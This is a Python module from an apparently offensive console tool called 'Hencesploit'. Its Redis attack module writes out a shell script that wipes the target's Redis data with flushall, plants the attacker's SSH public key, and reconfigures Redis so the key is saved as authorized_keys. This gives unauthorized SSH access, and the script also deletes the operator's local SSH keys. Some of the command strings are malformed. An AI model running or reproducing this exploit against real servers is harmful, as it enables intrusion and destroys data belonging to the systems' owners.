import socket,subprocess,os
from cmd import Cmd
from colored import fg,attr
from terminaltables import AsciiTable
from core.help_menus import project_help
key = ['rhost', 'rport', 'lhost', 'lport']
values = ['', '', '', '']
req = ['Yes', 'No', 'No', 'No']
class redis(Cmd):
    prompt = '%s Hencesploit > %s' % (fg(105), attr(0)) + '%s use >%s' % (fg(202), attr(0)) + '%s (%s'% (fg(196), attr(0)) + __name__ + '%s) > %s' % (fg(196), attr(0))

    def do_scan(self, line):
        os.system("""
#!/bin/bash
rm ~/.ssh/id*
ssh-keygen -t rsa

(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt

redis-cli -h """+ values[0]+""" flushall 
cat foo.txt | redis-cli -h"""+ values[0] + """"-x set crackit
redis-cli -h""" + values[0] + """config set dir /var/lib/redis/.ssh/
redis-cli -h"""+ values[0] + """config set dbfilename "authorized_keys"
redis-cli -h""" + values[0] + """save""")
    def do_show(self, line):
        if line == 'options' :
            table_data = [['OPTION', 'VALUE','REQUIRED']]
            for i in range(0, len(key)):
                table_data.append([key[i], values[i],req[i]])
            table = AsciiTable(table_data)
            print (table.table)

        else:
            print("%son development%s" %(fg(196), attr(0)))
    def do_set(self, line):
        try:
            k, v = line.split(' ')
            print(k, "===> ", v)
            for i in range(0,len(key)):
                if k == key[i] :
                    values[i] = v
        except KeyError:
            print("*** Unknown Option! option not has value!")
        except ValueError:
            print("*** Option not has value!")
            print("*** Example : set lhost 127.0.0.1")
    def do_back(self, line):
        module = globals()
        m = module['redis']
        splits = m.prompt.split(' > ')
        if len(splits) == 1:
            return True
        else:
            m.prompt = ' > '.join(splits[:-1]) + ' > '
            return True
    def do_help(self, arg):
        project_help.help()

if __name__ == '__main__':
    redis().cmdloop()